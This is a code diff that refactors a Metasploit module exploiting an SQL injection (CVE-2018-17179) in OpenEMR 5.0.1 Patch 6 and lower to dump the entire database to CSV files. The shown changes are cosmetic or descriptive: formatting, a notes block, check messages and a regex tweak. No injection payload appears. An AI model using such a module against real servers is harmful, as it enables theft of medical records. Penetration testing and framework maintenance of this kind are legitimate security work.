@@ -10,29 +10,36 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::SQLi
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'OpenEMR 5.0.1 Patch 6 SQLi Dump',
-      'Description' => '
-        This module exploits a SQLi vulnerability found in
-        OpenEMR version 5.0.1 Patch 6 and lower. The
-        vulnerability allows the contents of the entire
-        database (with exception of log and task tables) to be
-        extracted.
-        This module saves each table as a `.csv` file in your
-        loot directory and has been tested with
-        OpenEMR 5.0.1 (3).
-      ',
-      'License' => MSF_LICENSE,
-      'Author' =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'OpenEMR 5.0.1 Patch 6 SQLi Dump',
+        'Description' => %q{
+          This module exploits a SQLi vulnerability found in
+          OpenEMR version 5.0.1 Patch 6 and lower. The
+          vulnerability allows the contents of the entire
+          database (with exception of log and task tables) to be
+          extracted.
+          This module saves each table as a `.csv` file in your
+          loot directory and has been tested with
+          OpenEMR 5.0.1 (3).
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Will Porter <will.porter[at]lodestonesecurity.com>'
         ],
-      'References' => [
-        ['CVE', '2018-17179'],
-        ['URL', 'https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617']
-      ],
-      'DisclosureDate' => '2019-05-17'
-    ))
+        'References' => [
+          ['CVE', '2018-17179'],
+          ['URL', 'https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617']
+        ],
+        'DisclosureDate' => '2019-05-17',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
@@ -61,16 +68,16 @@ class MetasploitModule < Msf::Auxiliary
     # Check version
     print_status('Trying to detect installed version')
     version = openemr_version
-    return Exploit::CheckCode::Unknown if version.empty?
+    return Exploit::CheckCode::Unknown('Could not determine OpenEMR version') if version.empty?
 
     vprint_status("Version #{version} detected")
     version.sub! ' (', '.'
     version.sub! ')', ''
     version.strip!
 
-    return Exploit::CheckCode::Safe unless Rex::Version.new(version) < Rex::Version.new('5.0.1.7')
+    return Exploit::CheckCode::Safe("OpenEMR version #{version} is not vulnerable") unless Rex::Version.new(version) < Rex::Version.new('5.0.1.7')
 
-    Exploit::CheckCode::Appears
+    Exploit::CheckCode::Appears("OpenEMR version #{version} is in the vulnerable range")
   end
 
   def get_response(payload)
@@ -93,7 +100,7 @@ class MetasploitModule < Msf::Auxiliary
     # Use the same gsub pattern as store_loot
     # this will put the first 8 safe characters of the tablename
     # in the filename in the loot directory
-    safe_table = table.gsub(/[^a-z0-9\.\_]+/i, '')
+    safe_table = table.gsub(/[^a-z0-9._]+/i, '')
     store_loot(
       "openemr.#{safe_table}.dump",
       'application/CSV',
